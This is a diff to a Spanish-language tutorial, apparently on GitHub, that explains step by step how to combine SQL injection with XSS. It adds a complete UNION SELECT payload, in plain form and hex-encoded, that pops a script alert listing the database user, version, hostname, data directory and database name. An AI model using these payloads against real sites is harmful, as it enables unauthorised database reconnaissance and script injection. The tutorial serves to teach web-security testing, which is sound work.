@@ -64,7 +64,7 @@ vamos a explicar paso a paso esta inyeccion:
           
 3 - Estamos haciendo uso de caracteres especiales para personalizar el alert
 
-          `group_concat(group_concat(<script>alert("xss_y_sql_by_Y000!_,/n,------,/n,")</script>))`
+          `group_concat(<script>alert("xss_y_sql_by_Y000!_,/n,------,/n,")</script>)`
           
 4 - Usamos "Usuario::" para darle un lugar especifco a "user()" el cual usamos para que la inyeccion nos muestre el usuario que la pagina nos esta dando, en este caso tenemos "root@localhost" 
 
@@ -74,6 +74,33 @@ vamos a explicar paso a paso esta inyeccion:
 
 ![](ejemplos/4.png)
 
+
+Siguendo esta logica podemos usar consultas perzonalizadas. les recomiendo esta parte de mi escrito de inyecciones sql:
+
+https://github.com/Y000o/sql_injection_basic/blob/master/sql_injection_basic.md#mysql-sql-Injection-Cheat-Sheet
+
+Una vez elegido lo que queremos mostrar, podemos ir al siguiente paso, en este ejemplo yo elegi mostrar la siguiente informacion:
+
+```
+user()
+version()
+@@hostname
+@@datadir
+database()
+```
+
+payload:
+
+`group_concat(0x<script>alert("xss_y_sql_by_Y000!_,\n,------,\n,usuario::,user(),\n,------,\n,version::,version(),\n,------,\n,hostname::,@@hostname,\n,------,\n,directorio::,@@datadir,\n,------,\n,Database::,database(),\n,------,\n,")</script>)`
+
+
+payload completo con todas sus partes en hexadecimal:
+
+`union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,group_concat(0x3c7363726970743e616c657274607873735f795f73716c5f62795f59303030215f,0x5c6e,0x2d2d2d2d2d2d,0x5c6e,0x7573756172696f3a3a,user(),0x5c6e,0x2d2d2d2d2d2d,0x5c6e,0x76657273696f6e3a3a,version(),0x5c6e,0x2d2d2d2d2d2d,0x5c6e,0x686f73746e616d653a3a,@@hostname,0x5c6e,0x2d2d2d2d2d2d,0x5c6e,0x6469726563746f72696f3a3a,@@datadir,0x5c6e,0x2d2d2d2d2d2d,0x5c6e,0x44617461626173653a3a,database(),0x5c6e,0x2d2d2d2d2d2d,0x5c6e,0x603c2f7363726970743e),19,20,21+--+`
+
+El resultado es el siguiente:
+
+![](ejemplos/5.png)
 
 
 
